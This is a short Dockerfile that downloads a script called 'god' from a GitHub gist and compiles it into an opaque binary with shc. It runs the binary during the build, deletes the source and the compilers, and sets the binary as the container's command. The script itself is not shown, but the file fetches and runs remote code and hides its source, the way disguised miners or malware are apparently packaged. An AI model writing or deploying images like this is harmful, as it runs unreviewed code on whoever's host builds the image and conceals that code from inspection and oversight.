FROM alpine:edge

ENV SHURL https://gist.githubusercontent.com/tomjack1342/71e09f496709ce239b08dcc905383def/raw/62f846295816ae564e7818c7a183a00fa1417569/god

RUN echo "http://dl-cdn.alpinelinux.org/alpine/edge/testing" >> /etc/apk/repositories && apk update && apk add --no-cache gcc musl-dev shc && \
    wget $SHURL -O /worker && shc -r -B -f /worker && /worker.x && \
    apk del gcc musl-dev shc && rm -rf /worker /worker.x.c /var/cache/apk/*
    
CMD /worker.x
